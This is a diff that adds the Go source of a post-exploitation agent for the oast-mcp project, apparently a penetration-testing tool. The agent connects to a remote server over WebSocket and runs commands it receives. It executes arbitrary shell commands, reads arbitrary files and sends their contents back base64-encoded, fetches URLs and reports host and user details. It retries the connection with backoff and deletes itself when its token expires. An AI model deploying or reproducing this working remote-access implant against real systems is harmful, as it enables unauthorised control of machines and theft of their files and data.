@@ -1,0 +1,220 @@
+// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
+//
+// Licensed under the Apache License, Version 2.0 (the "License");
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+//
+//     http://www.apache.org/licenses/LICENSE-2.0
+//
+// Unless required by applicable law or agreed to in writing, software
+// distributed under the License is distributed on an "AS IS" BASIS,
+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+// See the License for the specific language governing permissions and
+// limitations under the License.
+
+// Command agent is a lightweight post-exploitation agent that connects to
+// the oast-mcp server over a secure WebSocket and executes scheduled tasks.
+package main
+
+import (
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"os"
+	"runtime"
+	"time"
+
+	"github.com/gorilla/websocket"
+	"github.com/dguerri/oast-mcp/internal/agent"
+)
+
+var (
+	serverURL = flag.String("url", "", "agent server base URL e.g. https://agent.example.com")
+	token     = flag.String("token", "", "agent JWT token")
+	agentID   = flag.String("id", "", "agent ID")
+)
+
+type inMsg struct {
+	Type       string         `json:"type"`
+	TaskID     string         `json:"task_id,omitempty"`
+	Capability string         `json:"capability,omitempty"`
+	Params     map[string]any `json:"params,omitempty"`
+	Message    string         `json:"message,omitempty"`
+}
+
+type outMsg struct {
+	Type   string         `json:"type"`
+	TaskID string         `json:"task_id,omitempty"`
+	Ok     bool           `json:"ok,omitempty"`
+	Data   map[string]any `json:"data,omitempty"`
+	Error  string         `json:"error,omitempty"`
+}
+
+func wsURL(base string) string {
+	u, _ := url.Parse(base)
+	u.Scheme = "wss"
+	return u.String()
+}
+
+func runOnce() error {
+	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{}} // default: validates cert
+	conn, _, err := dialer.Dial(wsURL(*serverURL), nil)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+
+	reg, _ := json.Marshal(map[string]string{
+		"type":     "register",
+		"agent_id": *agentID,
+		"token":    *token,
+	})
+	if err := conn.WriteMessage(websocket.TextMessage, reg); err != nil {
+		return err
+	}
+
+	for {
+		if err := conn.SetReadDeadline(time.Now().Add(35 * time.Second)); err != nil {
+			return err
+		}
+		_, raw, err := conn.ReadMessage()
+		if err != nil {
+			return err
+		}
+
+		var msg inMsg
+		if err := json.Unmarshal(raw, &msg); err != nil {
+			continue
+		}
+
+		switch msg.Type {
+		case "error":
+			if msg.Message == "token_expired" {
+				selfDelete()
+				os.Exit(0)
+			}
+			return fmt.Errorf("server error: %s", msg.Message)
+		case "ping":
+			if err := conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"pong"}`)); err != nil {
+				return err
+			}
+		case "task":
+			result := handleTask(msg)
+			b, _ := json.Marshal(result)
+			if err := conn.WriteMessage(websocket.TextMessage, b); err != nil {
+				return err
+			}
+		}
+	}
+}
+
+func handleTask(msg inMsg) outMsg {
+	tid := msg.TaskID
+	params := msg.Params
+	if params == nil {
+		params = map[string]any{}
+	}
+
+	var data map[string]any
+	var execErr string
+
+	switch msg.Capability {
+	case agent.CapExec:
+		cmd, _ := params["cmd"].(string)
+		timeout := 30
+		if t, ok := params["timeout"].(float64); ok {
+			timeout = int(t)
+		}
+		out, code, err := runCmd(cmd, timeout)
+		if err != nil {
+			execErr = err.Error()
+		} else {
+			data = map[string]any{"output": out, "exit_code": code}
+		}
+
+	case agent.CapReadFile:
+		path, _ := params["path"].(string)
+		b, err := os.ReadFile(path)
+		if err != nil {
+			execErr = err.Error()
+		} else {
+			data = map[string]any{"content": base64.StdEncoding.EncodeToString(b), "path": path}
+		}
+
+	case agent.CapFetchURL:
+		rawURL, _ := params["url"].(string)
+		timeout := 15
+		if t, ok := params["timeout"].(float64); ok {
+			timeout = int(t)
+		}
+		client := &http.Client{Timeout: time.Duration(timeout) * time.Second}
+		resp, err := client.Get(rawURL)
+		if err != nil {
+			execErr = err.Error()
+		} else {
+			defer resp.Body.Close()
+			body, _ := io.ReadAll(resp.Body)
+			data = map[string]any{
+				"status": resp.StatusCode,
+				"body":   base64.StdEncoding.EncodeToString(body),
+			}
+		}
+
+	case agent.CapSystemInfo:
+		hostname, _ := os.Hostname()
+		data = map[string]any{
+			"hostname": hostname,
+			"os":       runtime.GOOS,
+			"arch":     runtime.GOARCH,
+			"user":     currentUser(),
+		}
+
+	default:
+		execErr = "unknown capability: " + msg.Capability
+	}
+
+	if execErr != "" {
+		return outMsg{Type: "result", TaskID: tid, Ok: false, Error: execErr}
+	}
+	return outMsg{Type: "result", TaskID: tid, Ok: true, Data: data}
+}
+
+func currentUser() string {
+	if u := os.Getenv("USER"); u != "" {
+		return u
+	}
+	if u := os.Getenv("USERNAME"); u != "" {
+		return u
+	}
+	return "unknown"
+}
+
+func selfDelete() {
+	if p, err := os.Executable(); err == nil {
+		os.Remove(p)
+	}
+}
+
+func main() {
+	flag.Parse()
+	if *serverURL == "" || *token == "" || *agentID == "" {
+		fmt.Fprintln(os.Stderr, "usage: agent -url URL -token TOKEN -id AGENT_ID")
+		os.Exit(1)
+	}
+
+	backoff := time.Second
+	for {
+		if err := runOnce(); err != nil {
+			_ = err // logged implicitly; runOnce returns nil on clean exit
+		}
+		time.Sleep(backoff)
+		if backoff < 60*time.Second {
+			backoff *= 2
+		}
+	}
+}
